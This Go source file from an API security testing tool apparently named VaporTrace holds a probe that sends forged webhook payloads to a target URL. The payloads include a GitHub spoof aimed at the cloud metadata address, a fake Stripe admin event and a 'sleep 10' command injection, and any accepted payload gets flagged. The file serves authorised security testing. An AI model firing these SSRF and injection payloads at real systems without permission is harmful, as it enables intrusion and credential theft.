package logic

import (
	"bytes"
	"fmt"
	"net/http"
	"time"

	"github.com/JoseMariaMicoli/VaporTrace/pkg/db"
	"github.com/JoseMariaMicoli/VaporTrace/pkg/utils"
)

type IntegrationContext struct {
	TargetURL       string
	IntegrationType string
}

func (i *IntegrationContext) Probe() {
	// FIX: Replaced pterm header with safe TacticalLog
	utils.TacticalLog(fmt.Sprintf("[cyan::b]API10: Integration Probe Started (%s)[-:-:-]", i.IntegrationType))

	payloads := map[string]string{
		"GitHub-Spoof":      `{"repository": {"url": "http://169.254.169.254/latest/meta-data/"}, "sender": {"login": "vapor-trace"}}`,
		"Stripe-Spoof":      `{"id": "evt_test", "type": "customer.subscription.deleted", "data": {"object": {"metadata": {"internal_admin": "true"}}}}`,
		"Generic-Injection": `{"source": "third-party", "data": {"cmd": "sleep 10"}}`,
	}

	for name, body := range payloads {
		req, _ := http.NewRequest("POST", i.TargetURL, bytes.NewBuffer([]byte(body)))
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("X-Vapor-Trace-Tactical", "API10-Probe")
		req.Header.Set("User-Agent", fmt.Sprintf("VaporTrace-%s-Scanner", i.IntegrationType))

		start := time.Now()
		// Using SafeDo ensures Evasion and Loot scanning happen automatically
		resp, err := SafeDo(req, false, "API10-PROBE")
		duration := time.Since(start)

		if err != nil {
			utils.TacticalLog(fmt.Sprintf("[red]Probe Error [%s]: %v[-]", name, err))
			continue
		}
		defer resp.Body.Close()

		// FIX: Replaced pterm.Info.Printf with tactical log for latency feedback
		utils.TacticalLog(fmt.Sprintf("[gray]Payload: %-15s | Status: %d | Latency: %v[-]", name, resp.StatusCode, duration))

		if resp.StatusCode >= 200 && resp.StatusCode <= 299 {
			utils.RecordFinding(db.Finding{
				Phase:   "PHASE IV: INJECTION",
				Command: "probe", // Zero-Touch Trigger
				Target:  i.TargetURL,
				Details: fmt.Sprintf("Unsafe Integration [%s]: Accepted unsigned %s payload", i.IntegrationType, name),
				Status:  "VULNERABLE",
			})
		}
	}
	utils.TacticalLog("[green]✔[-] Integration Probe Complete.")
}
